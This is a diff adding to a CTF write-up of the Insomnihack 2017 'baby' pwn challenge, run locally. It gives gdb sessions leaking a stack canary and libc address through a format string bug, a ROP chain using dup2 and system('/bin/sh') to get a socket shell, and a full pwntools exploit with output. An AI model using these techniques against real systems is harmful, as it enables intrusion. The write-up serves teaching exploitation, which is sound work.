@@ -1,5 +1,8 @@
 # Insomnihack 2017 pwn 50 baby
 
+This writeup is based off of: http://pastebinthehacker.blogspot.com/2017/01/insomnihack-2017-baby.html
+Also I did not work on this challenge until a couple of years after the ctf, so I just solved it locally. In addition to that I just used a different copy of libc (included in this repo), and checked with a writeup to make sure it didn't impact the challenge greatly.
+
 So we are given a libc file and a binary. Let's take a look at the binary:
 
 ```
@@ -182,4 +185,289 @@ We can see that the bug is it allows us to decide how much data get's scanned in
 
 #### Additional Infoleaks
 
-Now since  `PIE` (along with the other binary protections) is enabled, we will need an additional infoleak in order to know what address we need to jump t. 
+Now since  `PIE` (along with the other binary protections) is enabled, we will need an additional infoleak in order to know what address we need to jump to. A good place to start would be the format string bug we used to get the stack canary leak. First set a breakpoint for right after the format string bug at `dofmt+0xec`:
+
+```
+gdb-peda$ inferior 2
+[Switching to inferior 2 [process 3103] (/Hackery/insomnihack17/baby/baby)]
+[Switching to thread 2.1 (process 3103)]
+#0  0x00007ffff7b06a1d in __libc_recv (fd=0x4, buf=0x7fffffffe4a0, len=0x2, flags=0x0)
+    at ../sysdeps/unix/sysv/linux/recv.c:28
+28  in ../sysdeps/unix/sysv/linux/recv.c
+gdb-peda$ b *dofmt+0xec
+Breakpoint 1 at 0x5555555555b4
+gdb-peda$ c
+Continuing.
+```
+
+then we trigger the breakpoint for the format string option with the input `15935728`:
+```
+Welcome to baby's first pwn.
+Pick your favorite vuln : 
+   1. Stack overflow
+   2. Format string
+   3. Heap Overflow
+   4. Exit
+Your choice > 2
+Simply type '\n' to return
+Your format > 15935728
+15935728
+```
+
+Now that we are at the breakpoint, let's see where our input is stored:
+```
+gdb-peda$ find 15935728
+Searching for '15935728' in: None ranges
+Found 2 results, display max 2 items:
+ [heap] : 0x55555575af30 ("15935728\n")
+[stack] : 0x7fffffffe070 ("15935728\n")
+```
+
+this might be a bit of a pain, but we can use telescope to analyze this section of memory. It will essentially just look at a region of memory that we give it, and tell us about the data there (such as if it is a pointer to libc). Here we just look at 200 lines, starting at `0x7fffffffe070`.
+
+```
+gdb-peda$ telescope 0x7fffffffe070 200
+```
+
+just going through the input, we can see the stack canary here:
+
+```
+1032| 0x7fffffffe478 --> 0xf2f8acf6f7458300 
+```
+
+a little bit later, we can see a libc pointer to `__libc_start_main+231`:
+```
+1192| 0x7fffffffe518 --> 0x7ffff7a05b97 (<__libc_start_main+231>: mov    edi,eax)
+```
+
+We can see that it is 20 qwords infront of the stack canary (which is at offset `144`). So it should be around offset `160`. Let's use a format string bug to find out where:
+```
+Your format > %155$lx.%156$lx.%157$lx.%158$lx.%159$lx.%160$lx.%161$lx.%162$lx.%163$lx.%164$lx.%165$lx
+7fffffffe5f0.f2f8acf6f7458300.555555555c30.7ffff7a05b97.2000000000.7fffffffe5f8.100000000.5555555559ff.0.675e72e97f8ad1cc.555555554ff0
+```
+
+Here we can see that the libc address offset is at `158`. We can leak it just like the stack canary, just change the offset. Also we can see that the offset to the start of the libc file I'm using is `0x21b97` by using the vmmap command, and since `0x7ffff7a05b97 - 0x00007ffff79e4000 = 0x21b97`:
+
+```
+gdb-peda$ vmmap
+Start              End                Perm  Name
+0x0000555555554000 0x0000555555557000 r-xp  /Hackery/insomnihack17/baby/baby
+0x0000555555756000 0x0000555555757000 r--p  /Hackery/insomnihack17/baby/baby
+0x0000555555757000 0x0000555555758000 rw-p  /Hackery/insomnihack17/baby/baby
+0x0000555555758000 0x0000555555779000 rw-p  [heap]
+0x00007ffff71a2000 0x00007ffff71ad000 r-xp  /lib/x86_64-linux-gnu/libnss_files-2.27.so
+0x00007ffff71ad000 0x00007ffff73ac000 ---p  /lib/x86_64-linux-gnu/libnss_files-2.27.so
+0x00007ffff73ac000 0x00007ffff73ad000 r--p  /lib/x86_64-linux-gnu/libnss_files-2.27.so
+0x00007ffff73ad000 0x00007ffff73ae000 rw-p  /lib/x86_64-linux-gnu/libnss_files-2.27.so
+0x00007ffff73ae000 0x00007ffff73b4000 rw-p  mapped
+0x00007ffff73b4000 0x00007ffff73cb000 r-xp  /lib/x86_64-linux-gnu/libnsl-2.27.so
+0x00007ffff73cb000 0x00007ffff75ca000 ---p  /lib/x86_64-linux-gnu/libnsl-2.27.so
+0x00007ffff75ca000 0x00007ffff75cb000 r--p  /lib/x86_64-linux-gnu/libnsl-2.27.so
+0x00007ffff75cb000 0x00007ffff75cc000 rw-p  /lib/x86_64-linux-gnu/libnsl-2.27.so
+0x00007ffff75cc000 0x00007ffff75ce000 rw-p  mapped
+0x00007ffff75ce000 0x00007ffff75d9000 r-xp  /lib/x86_64-linux-gnu/libnss_nis-2.27.so
+0x00007ffff75d9000 0x00007ffff77d8000 ---p  /lib/x86_64-linux-gnu/libnss_nis-2.27.so
+0x00007ffff77d8000 0x00007ffff77d9000 r--p  /lib/x86_64-linux-gnu/libnss_nis-2.27.so
+0x00007ffff77d9000 0x00007ffff77da000 rw-p  /lib/x86_64-linux-gnu/libnss_nis-2.27.so
+0x00007ffff77da000 0x00007ffff77e2000 r-xp  /lib/x86_64-linux-gnu/libnss_compat-2.27.so
+0x00007ffff77e2000 0x00007ffff79e2000 ---p  /lib/x86_64-linux-gnu/libnss_compat-2.27.so
+0x00007ffff79e2000 0x00007ffff79e3000 r--p  /lib/x86_64-linux-gnu/libnss_compat-2.27.so
+0x00007ffff79e3000 0x00007ffff79e4000 rw-p  /lib/x86_64-linux-gnu/libnss_compat-2.27.so
+0x00007ffff79e4000 0x00007ffff7bcb000 r-xp  /lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7bcb000 0x00007ffff7dcb000 ---p  /lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7dcb000 0x00007ffff7dcf000 r--p  /lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7dcf000 0x00007ffff7dd1000 rw-p  /lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7dd1000 0x00007ffff7dd5000 rw-p  mapped
+0x00007ffff7dd5000 0x00007ffff7dfc000 r-xp  /lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7fdf000 0x00007ffff7fe1000 rw-p  mapped
+0x00007ffff7ff7000 0x00007ffff7ffa000 r--p  [vvar]
+0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp  [vdso]
+0x00007ffff7ffc000 0x00007ffff7ffd000 r--p  /lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p  /lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7ffe000 0x00007ffff7fff000 rw-p  mapped
+0x00007ffffffde000 0x00007ffffffff000 rw-p  [stack]
+0xffffffffff600000 0xffffffffff601000 r-xp  [vsyscall]
+```
+
+
+#### ROP Chain
+
+Now that we have a buffer overflow vuln where we can get code exec, a stack canary and libc infoleak, we can make a ROP chain to pop a shell. Since what we are attacking is a remote server, we will have to redirect output to us. I will do this using the `dup2` function, which essentially takes two file descriptors and makes the file opened by the first file descriptor also opened by the second file descriptor. STDIN, STDOUT, and STDERR are file descriptors 0, 1, and 2. The socket which the process uses to talk to us is seen as a file descriptor by the program. Looking in the proc folder, we can see that the file descripter for the socket is `4`:
+
+```
+# ps -aux | grep baby
+root       3095  0.0  0.0  72716  4424 pts/1    S+   22:22   0:00 sudo gdb ./baby
+root       3096  0.0  0.6 136308 55576 pts/1    S+   22:22   0:00 gdb ./baby
+baby       3103  0.0  0.0  12972  2328 pts/1    t    22:22   0:00 /Hackery/insomnihack17/baby/baby
+guyinat+   3321  0.0  0.0  21536  1112 pts/7    S+   23:24   0:00 grep --color=auto baby
+# ls /proc/3103/fd
+0  1  2  4
+```
+
+So in order to redirect `STDIN`, `STDOUT`, and `STDERR` to us we will need three dup2 calls `dup2(4, 0)`, `dup2(4, 1)`, `dup2(4, 2)`. However after that we can just call system. All in all our payload will look like this:
+
+```
+0: 1032 bytes of filler until stack canary
+1: 8 byte stack canary
+2: 8 bytes of filler until return address
+```
+
+followed by that, we have our rop chain (this was automatically generated by pwntools):
+
+```
+0x0000:   0x7ffff7a07e6a pop rsi; ret
+0x0008:              0x0 [arg1] rsi = 0
+0x0010:   0x7ffff7a0555f pop rdi; ret
+0x0018:              0x4 [arg0] rdi = 4
+0x0020:   0x7ffff7af49a0 dup2
+0x0028:   0x7ffff7a07e6a pop rsi; ret
+0x0030:              0x1 [arg1] rsi = 1
+0x0038:   0x7ffff7a0555f pop rdi; ret
+0x0040:              0x4 [arg0] rdi = 4
+0x0048:   0x7ffff7af49a0 dup2
+0x0050:   0x7ffff7a07e6a pop rsi; ret
+0x0058:              0x2 [arg1] rsi = 2
+0x0060:   0x7ffff7a0555f pop rdi; ret
+0x0068:              0x4 [arg0] rdi = 4
+0x0070:   0x7ffff7af49a0 dup2
+0x0078:   0x7ffff7a0555f pop rdi; ret
+0x0080:   0x7ffff7b97e9a [arg0] rdi = 140737349516954
+0x0088:   0x7ffff7a33440 system
+```
+
+also I just used pwntool's built in automatic ROP chain building to do this.
+
+#### exploit
+
+putting it all together we get the following exploit:
+```
+from pwn import *
+
+# This exploit is based off of: http://pastebinthehacker.blogspot.com/2017/01/insomnihack-2017-baby.html
+
+# Establish the target, architecture, and the libc file
+libc = elf.ELF('libc-2.27.so')
+target = remote('127.0.0.1', 1337)
+context.arch = 'amd64'
+
+# Just a helper function to clear out text
+def clearMenu():
+        target.recvuntil("choice > ")
+
+# Function to use format string bug to leak value at offset
+def infoLeak(offset):
+        target.sendline("2")
+        target.recvuntil("Your format > ")
+        target.sendline("%" + str(offset) + "$lx")
+        leak = target.recvline().replace("\n", "")
+        leak = int(leak, 16)
+        log.info("The infoleak is: " + hex(leak))
+        target.sendline("")
+        clearMenu()
+        return leak
+
+# Sends payload to stack smash option
+def smashStack(payload):
+        target.sendline("1")
+        target.recvuntil("How much bytes you want to send ? ")
+        length = str(len(payload))
+        target.sendline(length)
+        target.sendline(payload)
+
+
+
+# Clear the initial text
+clearMenu()
+
+# Get the stack canary leak
+stackCanary = infoLeak(144)
+
+# Get the libc infoleak, and calculate the base
+libcLeak = infoLeak(158)
+libcBase = libcLeak - 0x21b97
+log.info("The base of libc is: " + hex(libcBase))
+
+# Declare the base of libc
+libc.address = libcBase
+
+# Make the rop chain:
+'''
+0x0000:   0x7ffff7a07e6a pop rsi; ret
+0x0008:              0x0 [arg1] rsi = 0
+0x0010:   0x7ffff7a0555f pop rdi; ret
+0x0018:              0x4 [arg0] rdi = 4
+0x0020:   0x7ffff7af49a0 dup2
+0x0028:   0x7ffff7a07e6a pop rsi; ret
+0x0030:              0x1 [arg1] rsi = 1
+0x0038:   0x7ffff7a0555f pop rdi; ret
+0x0040:              0x4 [arg0] rdi = 4
+0x0048:   0x7ffff7af49a0 dup2
+0x0050:   0x7ffff7a07e6a pop rsi; ret
+0x0058:              0x2 [arg1] rsi = 2
+0x0060:   0x7ffff7a0555f pop rdi; ret
+0x0068:              0x4 [arg0] rdi = 4
+0x0070:   0x7ffff7af49a0 dup2
+0x0078:   0x7ffff7a0555f pop rdi; ret
+0x0080:   0x7ffff7b97e9a [arg0] rdi = 140737349516954
+0x0088:   0x7ffff7a33440 system
+'''
+rop = ROP(libc)
+rop.dup2(4, 0)
+rop.dup2(4, 1)
+rop.dup2(4, 2)
+rop.system(list(libc.search("/bin/sh\x00"))[0])
+
+print rop.dump()
+
+# Form the payload, and send it
+payload = "0"*1032 + p64(stackCanary) + "1"*8 + str(rop)
+smashStack(payload)
+
+# Drop to an interactive shell
+target.interactive()
+```
+
+when we run it (with the exploit how it is, we have to start up the server seperately):
+
+```
+$ python exploit.py 
+[*] '/Hackery/insomnihack17/baby/libc-2.27.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to 127.0.0.1 on port 1337: Done
+[*] The infoleak is: 0xc762129b183d2900
+[*] The infoleak is: 0x7ffff7a05b97
+[*] The base of libc is: 0x7ffff79e4000
+[*] Loaded cached gadgets for 'libc-2.27.so'
+0x0000:   0x7ffff7a07e6a pop rsi; ret
+0x0008:              0x0 [arg1] rsi = 0
+0x0010:   0x7ffff7a0555f pop rdi; ret
+0x0018:              0x4 [arg0] rdi = 4
+0x0020:   0x7ffff7af49a0 dup2
+0x0028:   0x7ffff7a07e6a pop rsi; ret
+0x0030:              0x1 [arg1] rsi = 1
+0x0038:   0x7ffff7a0555f pop rdi; ret
+0x0040:              0x4 [arg0] rdi = 4
+0x0048:   0x7ffff7af49a0 dup2
+0x0050:   0x7ffff7a07e6a pop rsi; ret
+0x0058:              0x2 [arg1] rsi = 2
+0x0060:   0x7ffff7a0555f pop rdi; ret
+0x0068:              0x4 [arg0] rdi = 4
+0x0070:   0x7ffff7af49a0 dup2
+0x0078:   0x7ffff7a0555f pop rdi; ret
+0x0080:   0x7ffff7b97e9a [arg0] rdi = 140737349516954
+0x0088:   0x7ffff7a33440 system
+[*] Switching to interactive mode
+Good luck !
+$ w
+ 23:38:52 up  4:03,  1 user,  load average: 0.08, 0.05, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+guyinatu :0       :0               19:36   ?xdm?   1:16   0.01s /usr/lib/gdm3/gdm-x-session --run-script
+$ ls
+examples.desktop
+```
+
+Just like that, we popped a shell!
